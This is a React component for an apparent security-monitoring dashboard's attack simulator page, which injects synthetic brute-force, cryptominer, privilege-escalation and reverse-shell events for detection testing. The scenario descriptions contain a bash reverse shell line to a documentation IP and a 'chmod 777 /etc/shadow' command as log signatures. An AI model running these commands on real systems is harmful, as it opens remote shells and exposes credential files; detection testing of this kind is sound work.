import { useState } from 'react';
import { 
  Play, 
  CheckCircle2, 
  ShieldAlert, 
  Terminal, 
  Cpu, 
  KeyRound, 
  ArrowRight
} from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import api from '../services/api';

export default function Simulator() {
  const navigate = useNavigate();
  const [runningScenario, setRunningScenario] = useState<string | null>(null);
  const [results, setResults] = useState<any | null>(null);

  const scenarios = [
    {
      id: 'ssh_brute_force',
      title: 'SSH / Auth Credential Brute Force Wave',
      mitre: 'MITRE ATT&CK T1110 (Credential Access)',
      badgeColor: '#f97316',
      icon: KeyRound,
      description: 'Simulates a high-frequency credential stuffing or dictionary attack targeting root via sshd from external botnet IPs.',
      payloadDetails: 'Generates 5 rapid failed authentication events with foreign IP signatures within a 90-second sliding window.',
      expectedAIResult: 'AI Log Anomaly Engine flags T1110 Brute Force alert with 96% confidence and calculates threat source IP.'
    },
    {
      id: 'cryptominer_spike',
      title: 'Cryptominer CPU & Process Rogue Spike',
      mitre: 'MITRE ATT&CK T1496 (Resource Hijacking)',
      badgeColor: '#eab308',
      icon: Cpu,
      description: 'Simulates unauthorized background cryptocurrency mining (xmrig/minerd daemon) consuming sustained 96.8% host CPU.',
      payloadDetails: 'Dispatches metric telemetry surge (96.8% CPU, 82% RAM) combined with malicious process snapshot for xmrig.',
      expectedAIResult: 'AI Statistical Engine detects sustained baseline deviation and flags malicious cryptojacking signature.'
    },
    {
      id: 'root_privilege_escalation',
      title: 'Unauthorized Root Privilege Escalation',
      mitre: 'MITRE ATT&CK T1548 (Privilege Escalation)',
      badgeColor: '#f43f5e',
      icon: ShieldAlert,
      description: 'Simulates an unauthorized sudo invocation attempting to change permissions on protected security files (/etc/shadow).',
      payloadDetails: 'Injects sudo audit log with command: chmod 777 /etc/shadow executed from low-privilege user tty.',
      expectedAIResult: 'AI Engine flags CRITICAL T1548 Privilege Escalation alert and prompts immediate host network isolation.'
    },
    {
      id: 'reverse_shell',
      title: 'Interactive TCP Reverse Shell / C2 Beacon',
      mitre: 'MITRE ATT&CK T1059 (Execution)',
      badgeColor: '#ef4444',
      icon: Terminal,
      description: 'Simulates an attacker establishing an outbound interactive reverse bash socket to an external Command & Control IP.',
      payloadDetails: 'Injects process execution log matching signature: bash -i >& /dev/tcp/198.51.100.23/4444 0>&1.',
      expectedAIResult: 'AI Engine detects interactive shell redirection, flags CRITICAL T1059 alert, and recommends 1-click quarantine.'
    }
  ];

  const handleRunScenario = async (scenarioId: string) => {
    setRunningScenario(scenarioId);
    setResults(null);
    try {
      const res = await api.post(`/anomalies/simulate?scenario=${scenarioId}`);
      setResults(res.data);
    } catch (err: any) {
      alert(err?.response?.data?.detail || "Simulation failed");
    } finally {
      setRunningScenario(null);
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12 }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <h1 style={{ fontSize: '1.65rem', fontWeight: 800, margin: 0, letterSpacing: '-0.03em', color: '#f8fafc' }}>
              Security Lab & Attack Simulator
            </h1>
            <span className="neo-badge neo-badge-violet">
              LIVE VERIFICATION SUITE
            </span>
          </div>
          <p style={{ margin: '4px 0 0', fontSize: '0.85rem', color: '#64748b' }}>
            Inject realistic synthetic cyber attack scenarios to test and verify real-time AI anomaly detection
          </p>
        </div>

        <button 
          onClick={() => navigate('/threats')}
          className="neo-btn neo-btn-cyan"
          style={{ padding: '8px 14px', fontSize: '0.8rem' }}
        >
          View Live Threats Radar <ArrowRight size={14} />
        </button>
      </div>

      {/* Simulation Result Banner if active */}
      {results && (
        <div className="bento-card bento-card-emerald" style={{ padding: 20, background: '#091512' }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 16 }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
                <CheckCircle2 size={18} color="#10b981" />
                <h3 style={{ margin: 0, fontSize: '1.05rem', fontWeight: 800, color: '#f8fafc' }}>
                  Simulation Executed & Detected in Real-Time!
                </h3>
                <span className="neo-badge neo-badge-online">
                  {results.anomalies_detected} ANOMALY FLAGGED
                </span>
              </div>
              <p style={{ margin: '0 0 10px', fontSize: '0.84rem', color: '#cbd5e1' }}>
                {results.summary}
              </p>
              <div style={{ fontSize: '0.78rem', color: '#6ee7b7', fontFamily: 'JetBrains Mono, monospace' }}>
                Scenario: <strong>{results.scenario}</strong> • Dispatched into live pipeline
              </div>
            </div>

            <button 
              onClick={() => navigate('/threats')}
              className="neo-btn neo-btn-emerald"
              style={{ padding: '8px 16px', fontSize: '0.8rem' }}
            >
              Inspect in AI Threat Center &rarr;
            </button>
          </div>
        </div>
      )}

      {/* Scenarios Bento Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(440px, 1fr))', gap: 18 }}>
        {scenarios.map((sc) => {
          const Icon = sc.icon;
          const isRunning = runningScenario === sc.id;

          return (
            <div 
              key={sc.id}
              className="bento-card"
              style={{
                padding: 22,
                display: 'flex',
                flexDirection: 'column',
                justifyContent: 'space-between',
                borderColor: '#1e293b'
              }}
            >
              <div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
                  <div style={{
                    width: 36, height: 36, borderRadius: 8,
                    background: '#111726', border: '2px solid #1e293b',
                    display: 'flex', alignItems: 'center', justifyContent: 'center'
                  }}>
                    <Icon size={18} color="#06b6d4" />
                  </div>
                  <span className="neo-badge" style={{ background: sc.badgeColor, color: '#000' }}>
                    {sc.mitre.split(' ')[2]}
                  </span>
                </div>

                <h3 style={{ fontSize: '1.15rem', fontWeight: 800, color: '#f8fafc', margin: '0 0 6px' }}>
                  {sc.title}
                </h3>
                <div style={{ fontSize: '0.75rem', fontFamily: 'JetBrains Mono, monospace', color: '#8b5cf6', marginBottom: 10, fontWeight: 700 }}>
                  {sc.mitre}
                </div>

                <p style={{ fontSize: '0.84rem', color: '#94a3b8', lineHeight: 1.5, margin: '0 0 14px' }}>
                  {sc.description}
                </p>

                <div style={{
                  background: '#070a11', border: '1.5px solid #1e293b',
                  borderRadius: 6, padding: '8px 12px', marginBottom: 10
                }}>
                  <div style={{ fontSize: '0.68rem', fontFamily: 'JetBrains Mono, monospace', color: '#64748b', fontWeight: 700 }}>
                    ATTACK PAYLOAD DISPATCH:
                  </div>
                  <div style={{ fontSize: '0.78rem', color: '#cbd5e1', marginTop: 2 }}>
                    {sc.payloadDetails}
                  </div>
                </div>

                <div style={{
                  background: '#070a11', border: '1.5px solid #1e293b',
                  borderRadius: 6, padding: '8px 12px', marginBottom: 18
                }}>
                  <div style={{ fontSize: '0.68rem', fontFamily: 'JetBrains Mono, monospace', color: '#10b981', fontWeight: 700 }}>
                    AI DETECTION OUTCOME:
                  </div>
                  <div style={{ fontSize: '0.78rem', color: '#a7f3d0', marginTop: 2 }}>
                    {sc.expectedAIResult}
                  </div>
                </div>
              </div>

              <button
                onClick={() => handleRunScenario(sc.id)}
                disabled={isRunning}
                className="neo-btn neo-btn-violet"
                style={{ width: '100%', padding: '10px 16px' }}
              >
                <Play size={14} className={isRunning ? 'radar-spinner' : ''} />
                {isRunning ? 'Injecting Attack Payload...' : 'Launch Attack Simulation'}
              </button>
            </div>
          );
        })}
      </div>

    </div>
  );
}
